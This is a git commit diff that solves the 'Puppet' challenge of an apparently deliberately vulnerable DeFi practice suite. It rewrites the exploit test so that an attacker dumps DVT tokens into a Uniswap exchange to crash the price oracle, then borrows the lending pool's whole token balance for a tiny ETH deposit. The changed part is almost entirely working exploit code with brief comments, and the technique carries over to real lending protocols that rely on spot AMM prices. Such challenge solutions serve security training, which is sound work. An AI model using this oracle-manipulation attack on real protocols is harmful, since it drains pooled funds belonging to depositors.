c706607339d12e11f361f5eadf3f859a21afc9bb
balag3 <b.kocsis@ildsoftware.ch>
2021-12-28 17:10:06 +0100

    Solves Puppet

--- test/puppet/puppet.challenge.js
+++ test/puppet/puppet.challenge.js
@@ -102,52 +102,22 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        const printPrices = async () => {
-            const ethPriceInToken = await this.uniswapExchange.getEthToTokenInputPrice(
-                ethers.utils.parseEther('1'),
-                { gasLimit: 1e6 }
-            );
-            console.log(`ethPriceInToken : ${ethPriceInToken}`);
+        // approve all tokens from attacker to exchange
+        await this.token.connect(attacker).approve( this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
 
-            const tokenPriceInETth = await this.uniswapExchange.getTokenToEthInputPrice(
-                ethers.utils.parseEther('1'),
-                { gasLimit: 1e6 }
-            );
-            console.log(`tokenPriceInETth : ${tokenPriceInETth}`);
-
-            const balance = await ethers.provider.getBalance(this.uniswapExchange.address);
-            console.log(`eth balance : ${balance}`);
-
-            const deposit = await this.lendingPool.calculateDepositRequired(100000);
-            console.log(`deposit required: ${deposit}`);
-        };
-
-        /** CODE YOUR EXPLOIT HERE */
-
-
-        await printPrices();
-
-        // approve all tokens from attacker to exchnage
-        await this.token.connect(attacker).approve(
-            this.uniswapExchange.address,
-            ATTACKER_INITIAL_TOKEN_BALANCE
-        );
-
-        //buy up all the ETH with attackers available DVT token, this will break the 1:1 peg and will
-        // drive down the needed collateral drastically
-        const tx = await this.uniswapExchange.connect(attacker).tokenToEthSwapOutput(
-            ethers.utils.parseEther('9.9'),
+        //Buy as many ETH as possible with attackers available DVT token, this will break the 1:1 ratio
+        // drives down the needed collateral drastically
+        const tx = await this.uniswapExchange.connect(attacker).tokenToEthSwapOutput(ethers.utils.parseEther('9.9'),
             ATTACKER_INITIAL_TOKEN_BALANCE,
             (await ethers.provider.getBlock('latest')).timestamp * 2,
             { gasLimit: 1e6 }
         );
-        const { events } = await tx.wait();
+        await tx.wait();
 
-        await printPrices();
-
-        // borrow the max token count
-        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: ethers.utils.parseEther('25')})
-
+        const depositRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        expect(depositRequired < ATTACKER_INITIAL_ETH_BALANCE).to.be.true;
+        // borrow the max amount of token
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: depositRequired})
     });
 
     after(async function () {
